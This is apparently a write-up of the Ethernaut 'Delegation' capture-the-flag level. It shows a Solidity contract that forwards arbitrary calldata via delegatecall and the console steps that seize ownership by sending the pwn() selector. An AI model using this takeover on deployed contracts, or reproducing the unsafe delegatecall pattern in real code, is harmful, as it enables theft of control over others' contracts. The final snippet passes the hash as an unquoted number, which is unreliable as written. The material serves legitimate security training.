## Delegation Challenge

## The goal of this challenge is to claim ownership of this smart contract

Solidity Code: 
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

As you can see there are two contracts in this challenge instead of a single contract where we would be creating another one and sending a malicious transaction.

Now when we deploy the contract from ethernaut you have to understand that initally we are deploying the `Delegation` contract not the `Delegate` contract. So we can't just call the `pwn()` function.

Within the delegation contract we can see that the constructor already sets the deployer to the owner of the contract and the fallback is the only thing we can refer to, the fallback function has the delegatecall method and uses msg.data within.

So we will get the hash or `msg.data` of the `pwn()` function first by using the following snippet below

```bash
web3.utils.sha3("pwn()")
```

This will return a hash something similar to this :

```bash
0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab
```

Next, You can call the `pwn()` function and pass in the returned data: 

```javascript
await contract.sendTransaction(
    { data: 0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab });
```

And boom there you have it!!!

You should now be the owner of the contract and you should be able to see it like this: 

```javascript
await contract.owner()
```